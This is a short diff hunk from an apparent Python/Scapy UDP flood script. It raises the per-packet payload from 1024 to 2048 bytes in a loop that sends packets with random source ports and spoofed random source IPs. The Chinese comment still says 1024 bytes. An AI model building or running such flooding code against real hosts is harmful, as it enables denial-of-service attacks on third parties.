@@ -20,7 +20,7 @@ def UDP_Flood(dstIP, dstPort, counter):
     
     for x in range(0, counter):
         s_port = randInt()
-        payload = Raw(load="X" * 1024)  # 设置负载大小为1024字节
+        payload = Raw(load="X" * 2048)  # 设置负载大小为1024字节
 
         IP_Packet = IP()
         IP_Packet.src = randomIP()
